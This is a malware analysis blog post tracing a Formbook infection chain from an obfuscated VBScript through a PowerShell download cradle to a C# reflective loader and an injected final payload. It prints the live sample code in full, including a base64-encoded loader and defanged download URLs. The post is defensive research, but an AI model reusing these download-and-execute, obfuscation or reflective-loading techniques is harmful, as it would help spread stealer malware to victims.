---
layout: post
title: "Formbook Distributed Via VBScript, PowerShell, and C# Code"
date: 2022-03-25
categories: malware
tags: malware formbook vbscript powershell csharp 
permalink: /formbook-via-vbs-powershell-and-csharp/
---

Formbook is one of the threats that I categorize as part of the "background noise of exploitation" on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbook and distribute it to victims in an opportunistic fashion. This is really similar to the model of buying other stealers like Redline or RATs like Netwire. In this blog post, I'll walk through the analysis of a VBScript designed to eventually drop Formbook to a victim. For those following along at home, the sample I'm working with is here in MalwareBazaar: [https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/](https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/).

## Triaging the file

To start off, let's verify the first stage is a VBScript. We can use a combination of `file`, `xxd`, and `head` to do this.

```console
remnux@remnux:~/cases/formbook-vbs$ file revised-invoice.vbs 
revised-invoice.vbs: ASCII text, with CRLF line terminators

remnux@remnux:~/cases/formbook-vbs$ xxd revised-invoice.vbs | head
00000000: 4d4e 4342 4243 5842 4e43 5842 4e58 4242  MNCBBCXBNCXBNXBB
00000010: 4d43 5842 4358 4d58 434e 5843 424e 203d  MCXBCXMXCNXCBN =
00000020: 2022 5722 2622 5322 2622 6322 2622 5222   "W"&"S"&"c"&"R"
00000030: 2622 6922 2643 4852 2838 3029 2622 742e  &"i"&CHR(80)&"t.
00000040: 2226 2273 2226 2268 2226 4348 5228 3639  "&"s"&"h"&CHR(69
00000050: 2926 224c 2226 224c 220d 0a53 6574 2042  )&"L"&"L"..Set B
00000060: 4e43 585a 4d58 5842 4e58 424e 4358 4e4d  NCXZMXXBNXBNCXNM
00000070: 4358 424e 4358 4e43 434e 5858 4e43 5842  CXBNCXNCCNXXNCXB
00000080: 4d43 584d 4a48 4453 4453 4a20 3d20 4372  MCXMJHDSDSJ = Cr
00000090: 6561 7465 4f62 6a65 6374 284d 4e43 4242  eateObject(MNCBB
```

The `file` output of "ASCII text" is consistent with what I expect from a VBScript file, it should be just text in a file. The `xxd` output is consistent as well. The ASCII representation of the bytes on the right side show plain text. We can take a look at the contents here:

```vb
MNCBBCXBNCXBNXBBMCXBCXMXCNXCBN = "W"&"S"&"c"&"R"&"i"&CHR(80)&"t."&"s"&"h"&CHR(69)&"L"&"L"
Set BNCXZMXXBNXBNCXNMCXBNCXNCCNXXNCXBMCXMJHDSDSJ = CreateObject(MNCBBCXBNCXBNXBBMCXBCXMXCNXCBN)
UIWUEWIUIEWUYEIUEWWUEWEIEWU = "Po"
JHDSJHDSHJDSJHDSJHDSJJDSSDSHDSJHDSJHSJDSJDSJ = "W"&CHR(69)&"RshE"
HSDHDSHJDSJHDSJHDSJHSDJHDSJHDSJHDSJSDJDJDSJ = ""+UIWUEWIUIEWUYEIUEWWUEWEIEWU+JHDSJHDSHJDSJHDSJHDSJJDSSDSHDSJHDSJHSJDSJDSJ+"LL -exeCutiO BYpASS -C  I`eX(n`EW-Ob`J`EcT nET`.weBCLi`ENt).DoWnloAdStRiNG('hxxps://transfer[.]sh/get/9GqmOG/jramooooss.ps1') "
BNCXZMXXBNXBNCXNMCXBNCXNCCNXXNCXBMCXMJHDSDSJ.Run(HSDHDSHJDSJHDSJHDSJHSDJHDSJHDSJHDSJSDJDJDSJ),0
```

Just looking at the code above gives us a couple leads. First, the `transfer[.]sh` URL looks like it downloads some code to execute in PowerShell. We can clean up the code a bit to see what the simplified script would be:

```vb
Set WscriptShell = CreateObject("WScript.Shell")
WscriptShell.Run("powershell -exeCutiO BYpASS -C  I`eX(n`EW-Ob`J`EcT nET`.weBCLi`ENt).DoWnloAdStRiNG('hxxps://transfer[.]sh/get/9GqmOG/jramooooss.ps1') "),0
```

The PowerShell command issued by this script will then cause `wscript.exe` to spawn `powershell.exe`, download code from `transfer[.]sh`, and execute it using an Invoke-Expression cmdlet.

## Examining the PowerShell

To get further in the next step, we can examine `jramooooss.ps1`. After inserting some line breaks to beautify the code, we have:

```powershell
$whatever = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5JTzt1c2luZyBTeXN0ZW0uTmV0O3VzaW5nIFN5c3RlbS5SZWZsZWN0aW9uO3VzaW5nIFN5c3RlbS5UaHJlYWRpbmc7bmFtZXNwYWNlIG5TaGZWbER5akYuaXFCTGZDckZrQQp7cHVibGljIGNsYXNzIEJaVWxGTnh0R2d0Qk9xRFFQaVdSZVNpZ28Ke3ByaXZhdGUgY29uc3Qgc3RyaW5nIHl0WG5XV0dBSG1ERGtsdGlhbVZCYmtvbnI9Imh0dHBzOi8vdHJhbnNmZXIuc2gvZ2V0LzdFdVhxNS9SWUpHSkhKREdIUi5leGUiO3ByaXZhdGUgTWVtb3J5U3RyZWFtIFlTdE9jV0ljSGNKdElVdE9pbFpaSlhsYkE9bmV3IE1lbW9yeVN0cmVhbSgpO1tTVEFUaHJlYWRdCnB1YmxpYyB2b2lkIFpia2lwRVpsTnhqcm93UnZQTmx1cURma1UoKQp7bWRVcUtXd3pPUXJDdHlLVnRJaEdOUVhVaSgpO1pOV3JQbk55ZlBMaXpwUU1Sa2xXckNGdWooKTt9CnByaXZhdGUgdm9pZCBaTldyUG5OeWZQTGl6cFFNUmtsV3JDRnVqKCkKe2J5dGVbXWJ1ZmZlcj1ZU3RPY1dJY0hjSnRJVXRPaWxaWkpYbGJBLlRvQXJyYXkoKTtBc3NlbWJseSBhc3NlbWJseT1udWxsO2lmKEVudmlyb25tZW50LlZlcnNpb24uTWFqb3I+PTQpCntNZXRob2RJbmZvIG1ldGhvZD1UeXBlLkdldFR5cGUoIlN5c3RlbS5SZWZsZWN0aW9uLlJ1bnRpbWVBc3NlbWJseSIpLkdldE1ldGhvZCgibkxvYWRJbWFnZSIsQmluZGluZ0ZsYWdzLk5vblB1YmxpY3xCaW5kaW5nRmxhZ3MuU3RhdGljKTthc3NlbWJseT0oQXNzZW1ibHkpbWV0aG9kLkludm9rZShudWxsLG5ldyBvYmplY3RbXXtidWZmZXIsbnVsbCxudWxsLG51bGwsZmFsc2UsZmFsc2UsbnVsbH0pO31lbHNlCntNZXRob2RJbmZvIG1ldGhvZD1UeXBlLkdldFR5cGUoIlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IikuR2V0TWV0aG9kKCJuTG9hZEltYWdlIixCaW5kaW5nRmxhZ3MuTm9uUHVibGljfEJpbmRpbmdGbGFncy5TdGF0aWMpO2Fzc2VtYmx5PShBc3NlbWJseSltZXRob2QuSW52b2tlKG51bGwsbmV3IG9iamVjdFtde2J1ZmZlcixudWxsLG51bGwsbnVsbCxmYWxzZX0pO30Kb2JqZWN0W11hcmdzPW5ldyBvYmplY3RbMV07aWYoYXNzZW1ibHkuRW50cnlQb2ludC5HZXRQYXJhbWV0ZXJzKCkuTGVuZ3RoPT0wKQphcmdzPW51bGw7YXNzZW1ibHkuRW50cnlQb2ludC5JbnZva2UobnVsbCxhcmdzKTt9CnByaXZhdGUgdm9pZCBtZFVxS1d3ek9RckN0eUtWdEloR05RWFVpKCkKe1dlYlJlcXVlc3QgcmVxdWVzdD1XZWJSZXF1ZXN0LkNyZWF0ZSh5dFhuV1dHQUhtRERrbHRpYW1WQmJrb25yKTtXZWJSZXNwb25zZSByZXNwb25zZT1yZXF1ZXN0LkdldFJlc3BvbnNlKCk7dXNpbmcoU3RyZWFtIHdlYl9zdHJlYW09cmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKe2J5dGVbXWJ1ZmZlcj1uZXcgYnl0ZVs4MTkyXTtpbnQgcmVhZD0wO3doaWxlKChyZWFkPXdlYl9zdHJlYW0uUmVhZChidWZmZXIsMCxidWZmZXIuTGVuZ3RoKSk+MCkKe1lTdE9jV0ljSGNKdElVdE9pbFpaSlhsYkEuV3JpdGUoYnVmZmVyLDAscmVhZCk7fX0KcmVzcG9uc2UuQ2xvc2UoKTt9fX0=";
$dec = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($whatever));
Add-Type -TypeDefinition $dec;
$instance = New-Object nShfVlDyjF.iqBLfCrFkA.BZUlFNxtGgtBOqDQPiWReSigo;
$instance.ZbkipEZlNxjrowRvPNluqDfkU();
```

The PowerShell code is fairly brief. The `$whatever` variable contains base64-encoded text that soon gets decoded into `$dec`. Immediately after, PowerShell calls [`Add-Type`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) and specified the decoded text as a TypeDefinition. This action assumes code passed into the TypeDefinition is .NET code, and PowerShell compiles that code into a .NET DLL module using the relevant compiler. After the .NET type gets compiled and added into PowerShell, the script creates an object of the type `nShfVlDyjF.iqBLfCrFkA.BZUlFNxtGgtBOqDQPiWReSigo` and calls the function `ZbkipEZlNxjrowRvPNluqDfkU()`.

> Sidebar- I've heard folks over the last few years say "PowerShell is dead, .NET is where the modern tradecraft is". I strongly disagree, because I see PowerShell exploitation every day and modern adversaries simply mix PowerShell with .NET technologies. 

The question now is, what code went into that `Add-Type` call? We can decode the base64 chunk ourselves, revealing some C# code. I've gone ahead and added whitespace and renamed some of the function calls to make it easier to read.

```cs
using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
namespace nShfVlDyjF.iqBLfCrFkA
{
    public class BZUlFNxtGgtBOqDQPiWReSigo
    {
        private const string exe_url="hxxps://transfer[.]sh/get/7EuXq5/RYJGJHJDGHR.exe";
        private MemoryStream exe_memory_stream=new MemoryStream();
        [STAThread]
        public void ZbkipEZlNxjrowRvPNluqDfkU()
        {
            download_exe_to_memory_stream();
            memory_stream_to_reflective_load();
        }

        private void memory_stream_to_reflective_load()
        {
            byte[]buffer=exe_memory_stream.ToArray();
            Assembly assembly=null;
            if(Environment.Version.Major>=4)
            {
                MethodInfo method=Type.GetType("System.Reflection.RuntimeAssembly").GetMethod("nLoadImage",BindingFlags.NonPublic|BindingFlags.Static);assembly=(Assembly)method.Invoke(null,new object[]{buffer,null,null,null,false,false,null});
            }
            else
            {
                MethodInfo method=Type.GetType("System.Reflection.Assembly").GetMethod("nLoadImage",BindingFlags.NonPublic|BindingFlags.Static);assembly=(Assembly)method.Invoke(null,new object[]{buffer,null,null,null,false});
            }
            object[]args=new object[1];
            if(assembly.EntryPoint.GetParameters().Length==0)
                args=null;assembly.EntryPoint.Invoke(null,args);
        }

        private void download_exe_to_memory_stream()
        {
            WebRequest request=WebRequest.Create(exe_url);
            WebResponse response=request.GetResponse();
            using(Stream web_stream=response.GetResponseStream())
            {
                byte[]buffer=new byte[8192];
                int read=0;
                while((read=web_stream.Read(buffer,0,buffer.Length))>0)
                {
                    exe_memory_stream.Write(buffer,0,read);
                }
            }
            response.Close();
        }
    }
}
```

The `ZbkipEZlNxjrowRvPNluqDfkU()` function called branches into two additional functions. The first one downloads a Windows EXE file and pushes the contents into a [MemoryStream](https://docs.microsoft.com/en-us/dotnet/api/system.io.memorystream?view=net-6.0) object. The second function then takes the MemoryStream and loads its contents using .NET reflection. The method it uses to do reflective loading is slightly unusual. I typically see malware using `[System.Reflection.Assembly]::Load()`, `LoadFile()`, or `LoadFrom()` to load an EXE or DLL into memory. In this case, the malware uses a method called `nLoadImage()`. This specific method is part of the Reflection.Assembly or Reflection.RuntimeAssembly classes and is [usually called by the normal `Load()` functions](https://exploitmonday.blogspot.com/2013_11_10_archive.html). This malware skips the normal loading method and specifically calls the underlying thing it relies on instead.

So far we have this execution pattern: `wscript.exe` > `powershell.exe` > compile C# > execute C# code to download and execute an EXE inside `powershell.exe`.

Getting to the next stage, we can tear into the downloaded EXE, `RYJGJHJDGHR.exe`.

## RYJGJHJDGHR.exe, I can't even spell it

Let's figure out what kind of EXE we have using `diec`.

```console
remnux@remnux:~/cases/formbook-vbs$ diec RYJGJHJDGHR.exe 
PE32
    Protector: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar]
    Library: .NET(v4.0.30319)[-]
    Linker: Microsoft Linker(48.0)[GUI32]
```

Immediately, Detect-It-Easy tells us we're dealing with a .NET executable obfuscated with .NET Reactor. This is some kinda-good news because we can easily compile the executable to source even if that source is obfuscated. Since I can't include the entire source of the executable here, I want to go ahead and share the hash and VT link: [51c7f45ca2d7d26be5e7d6b51aec8e0a](https://www.virustotal.com/gui/file/3b8a5b17925c115df3673e81b408684a6199b9dc6e715810a43444d297c5089d). From here on in, I'll show portions of the decompiled code as relevant. To obtain the decompiled code, we can use `ilspycmd`.

```console
ilspycmd RYJGJHJDGHR.exe > RYJGJHJDGHR.decompiled.cs
```

The big point to focus on is the `Main()` method, which is the entry point for this stage. The function contains an EXE and DLL that have both been encoded into base64 with some characters replaced for basic obfuscation.

![Base64-encoded Payload](/assets/images/formbook-via-vbs-powershell-and-csharp/base64-replacement-obfuscation.png)

After the encoded chunks there is also a chunk of code containing a process path:

```cs
obj = new object[4]
{
    "ERERRWRWRWSGGSAGDHHJHJBNCBNCBN".Replace("ERERRWRWRWSGGSAGDHHJHJBNCBNCBN", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe"),
    empty,
    array,
    true
};
```

Having the pattern of EXE + DLL + process name is usually a sign of upcoming process injection in the samples I analyze. I assume the DLL will be injection code, the process name is the process a payload will be injected into, and the EXE will be the final payload. By doing find/replace and base64 decoding we got the payload.

```console
remnux@remnux:~/cases/formbook-vbs$ head -c 100 payload.b64 
TVpFUugAAAAAWIPoCYvIg8A8iwADwYPAKAMI/+GQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuAAAAA4fug4AtAnNIbgB

remnux@remnux:~/cases/formbook-vbs$ cat payload.b64 | base64 -d > payload.bin
remnux@remnux:~/cases/formbook-vbs$ diec payload.bin 
PE32
    Compiler: MASM(10.00.40219)[-]
    Linker: Microsoft Linker(10.0)[GUI32]
```

The extracted EXE is a native Windows binary and not .NET so it'll take a bit more to tear apart. The good news is that we can identify it as Formbook using YARA, though!

```console
remnux@remnux:~/cases/formbook-vbs$ yara-rules payload.bin 
CRC32b_poly_Constant payload.bin
RIPEMD160_Constants payload.bin
SHA1_Constants payload.bin
maldoc_getEIP_method_1 payload.bin
Formbook payload.bin
IsPE32 payload.bin
IsWindowsGUI payload.bin
IsPacked payload.bin
HasOverlay payload.bin
ImportTableIsBad payload.bin
HasRichSignature payload.bin
Microsoft_Visual_Cpp_v50v60_MFC payload.bin
Borland_Delphi_30_additional payload.bin
Borland_Delphi_30_ payload.bin
Borland_Delphi_v40_v50 payload.bin
Borland_Delphi_v30 payload.bin
Borland_Delphi_DLL payload.bin
```

## Further work

This is where I want to stop for the night because I've achieved my goal of getting the end payload and identifying it. If you want to continue and learn more, I encourage you to try to find the injector code in `RYJGJHJDGHR.exe`, decode it, and decompile it to source. If you want to learn more about YARA, try to figure out how YARA knows the `payload.bin` binary is Formbook. Thank you for reading!